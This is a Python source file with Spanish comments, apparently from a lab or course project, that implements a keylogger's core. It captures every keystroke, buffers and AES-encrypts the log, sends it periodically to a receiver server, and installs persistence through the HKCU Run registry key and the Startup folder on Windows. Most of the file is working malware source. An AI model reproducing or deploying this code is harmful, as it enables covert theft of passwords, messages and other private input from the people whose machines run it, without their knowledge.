"""
keylogger.py
Núcleo del keylogger.

Funcionalidades requeridas:
- Captura de TODAS las teclas pulsadas
- Buffer en memoria
- Envío periódico (usando exfiltration)
- Persistencia (llamada desde aquí o instalador)

Limitaciones conocidas que debes documentar:
- Muchos navegadores ofuscan contraseñas en campos <input type="password">.
- Teclas especiales (Shift, Ctrl, Alt, flechas, etc.) deben manejarse.
- En Windows 11 puede haber más protecciones (Defender, etc.).
- No captura en algunos procesos con privilegios altos.

pynput + Windows 11 funciona correctamente en la mayoría de casos.
"""

from pynput import keyboard
from datetime import datetime
import os
import time
import threading

from app_paths import get_app_dir, get_default_entrypoint, get_key_path
from config import SEND_INTERVAL
from crypto_utils import encrypt, load_key, generate_key, save_key
from persistence import install_persistence
from exfiltration import send_encrypted_data

# Buffer global: lista de tuplas (timestamp, tecla)
# buffer_lock evita que el hilo de envío y on_press escriban al mismo tiempo
buffer = []
buffer_lock = threading.Lock()


def _load_or_create_key():
    key_path = get_key_path()
    try:
        return load_key(key_path)
    except FileNotFoundError:
        print("[*] Generando nueva clave AES...")
        key = generate_key()
        save_key(key, key_path)
        print(f"[+] Clave guardada en {key_path} (¡NO subir al repositorio!)")
        return key


KEY = _load_or_create_key()


def on_press(key):
    """
    Callback de pynput: se ejecuta en cada pulsación.
    key.char funciona en letras/números; las teclas especiales no tienen .char.
    """
    try:
        char = key.char  # tecla normal (a, 1, etc.)
    except AttributeError:
        # Tecla especial sin representación directa (Enter, Shift, etc.)
        if key == keyboard.Key.space:
            char = " "
        elif key == keyboard.Key.enter:
            char = "\n[ENTER]\n"
        elif key == keyboard.Key.tab:
            char = "\t[TAB]\t"
        elif key == keyboard.Key.backspace:
            char = "[BACKSPACE]"
        else:
            char = f"[{key.name.upper()}]"

    with buffer_lock:
        buffer.append((datetime.now(), char))


def on_release(key):
    """Opcional: detectar combinación para detener (solo en pruebas)."""
    if key == keyboard.Key.esc:
        # En producción real nunca usarías ESC para parar.
        # Se usa solo para pruebas controladas en VM.
        print("\n[!] Tecla ESC detectada. Deteniendo keylogger...")
        return False


def get_buffer_and_clear():
    """Devuelve el contenido actual del buffer y lo limpia."""
    global buffer
    with buffer_lock:
        data = list(buffer)
        buffer.clear()
    return data


def capture_loop():
    """Bucle principal de captura."""
    print("[*] Keylogger iniciado. Capturando teclas...")
    print("[*] Presiona ESC para detener (solo entorno de pruebas).")

    # Iniciar listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


def exfiltration_loop():
    """
    Hilo secundario (daemon): cada SEND_INTERVAL segundos vacía el buffer,
    formatea el log, lo cifra y lo envía al receptor Flask.
    """
    while True:
        time.sleep(SEND_INTERVAL)  # intervalo configurable en config.py
        data = get_buffer_and_clear()

        if not data:
            continue  # no hubo teclas en este intervalo

        # Formato: "2026-07-06T10:00:00 | a"
        log_lines = []
        for timestamp, char in data:
            log_lines.append(f"{timestamp.isoformat()} | {char}")

        raw_log = "\n".join(log_lines).encode("utf-8")

        # Cifrar
        try:
            encrypted = encrypt(raw_log, KEY)
            print(f"[+] Datos capturados ({len(data)} eventos). Enviando cifrado...")
            send_encrypted_data(encrypted)
        except Exception as e:
            print(f"[-] Error cifrando/enviando: {e}")


if __name__ == "__main__":
    # Importante al arrancar desde el registro: el cwd puede ser System32
    os.chdir(get_app_dir())

    # Registra el .bat en HKCU Run + carpeta Inicio (solo en Windows)
    install_persistence(get_default_entrypoint())

    # Hilo daemon: si el programa termina, el hilo también se cierra
    exfil_thread = threading.Thread(target=exfiltration_loop, daemon=True)
    exfil_thread.start()

    # Hilo principal bloqueante: mantiene vivo el listener de pynput
    capture_loop()
